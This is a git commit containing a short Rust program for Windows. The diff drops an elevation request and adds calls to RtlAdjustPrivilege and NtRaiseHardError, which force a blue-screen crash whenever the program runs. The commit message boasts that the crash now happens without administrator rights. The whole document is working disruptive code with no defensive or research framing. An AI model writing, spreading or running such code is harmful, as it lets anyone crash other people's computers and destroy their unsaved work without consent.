0b1fe910f82c47d8141ff3a17b9a3b7caf5f5d2f
Destroy <emptycsgo@mail.ru>
2025-02-11 17:17:35 +0300

    Administrator permission request was removed and the error call was fixed, now the BSoD appears regardless of the application permissions.

--- src/main.rs
+++ src/main.rs
@@ -1,75 +1,48 @@
-use std::ffi::OsStr;
-use std::os::windows::ffi::OsStrExt;
-use std::ptr;
-use winapi::shared::windef::HWND;
-use winapi::um::errhandlingapi::{RaiseException, SetErrorMode};
-use winapi::um::processthreadsapi::OpenProcessToken;
-use winapi::um::shellapi::ShellExecuteW;
-use winapi::um::winbase::SEM_FAILCRITICALERRORS;
-use winapi::um::winnt::LPCWSTR;
-use winapi::um::winuser::SW_HIDE;
+use std::ptr::null_mut;
+use winapi::shared::ntdef::{NTSTATUS, PULONG, ULONG};
+use winapi::um::winnt::{BOOLEAN, PBOOLEAN};
 
-fn run_as_admin() -> bool {
-    let exe_path = match std::env::current_exe() {
-        Ok(path) => path,
-        Err(_) => return false,
-    };
+#[link(name = "ntdll")]
+extern "system" {
 
-    let mut exe_path: Vec<u16> = exe_path.as_os_str()
-        .encode_wide()
-        .chain(std::iter::once(0))
-        .collect();
+    // extern RtlAdjustPrivilege
+    fn RtlAdjustPrivilege(
+        Privilege: ULONG,
+        Enable: BOOLEAN,
+        CurrentThread: BOOLEAN,
+        Enabled: PBOOLEAN,
+    ) -> NTSTATUS;
 
-    let operation: Vec<u16> = OsStr::new("runas\0").encode_wide().collect();
-
-    unsafe {
-        let result = ShellExecuteW(
-            ptr::null_mut() as HWND,
-            operation.as_ptr() as LPCWSTR,
-            exe_path.as_ptr() as LPCWSTR,
-            ptr::null(),
-            ptr::null(),
-            SW_HIDE
-        );
-
-        result as i32 > 32
-    }
-}
-
-fn is_elevated() -> bool {
-    unsafe {
-        let mut token = ptr::null_mut();
-        if OpenProcessToken(
-            winapi::um::processthreadsapi::GetCurrentProcess(),
-            winapi::um::winnt::TOKEN_QUERY,
-            &mut token
-        ) == 0 {
-            return false;
-        }
-
-        let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
-        let mut size = 0;
-        let ret = winapi::um::securitybaseapi::GetTokenInformation(
-            token,
-            winapi::um::winnt::TokenElevation,
-            &mut elevation as *mut _ as *mut _,
-            size_of::<winapi::um::winnt::TOKEN_ELEVATION>() as u32,
-            &mut size
-        );
-
-        winapi::um::handleapi::CloseHandle(token);
-        ret != 0 && elevation.TokenIsElevated != 0
-    }
+    // extern NtRaiseHardError
+    fn NtRaiseHardError(
+        ErrorStatus: NTSTATUS,
+        NumberOfParameters: ULONG,
+        UnicodeStringParameterMask: ULONG,
+        Parameters: PULONG,
+        ValidResponseOptions: ULONG,
+        Response: &mut ULONG,
+    ) -> NTSTATUS;
 }
 
 fn main() {
-    if !is_elevated() {
-        let _ = run_as_admin();
-        return;
-    }
     unsafe {
-        SetErrorMode(SEM_FAILCRITICALERRORS);
+        let mut enabled: BOOLEAN = 0; // response of RtlAdjustPrivilege
 
-        RaiseException(0xDEADDEAD, 0, 0, ptr::null());
+        // gives the application the right to turn off the system
+        RtlAdjustPrivilege(19, 1, 0, &mut enabled);
+
+        let mut response: ULONG = 0; // response of NtRaiseHardError
+
+        // pub const STATUS_ASSERTION_FAILURE: DWORD = 0xC0000420
+        // used information https://github.com/toxidworm/SimpleBSOD/blob/main/BSOD.cpp
+
+        NtRaiseHardError(
+            0xC0000420u32 as NTSTATUS, // code of STATUS_ASSERTION_FAILURE
+            0,
+            0,
+            null_mut(),
+            6,
+            &mut response,
+        );
     }
 }
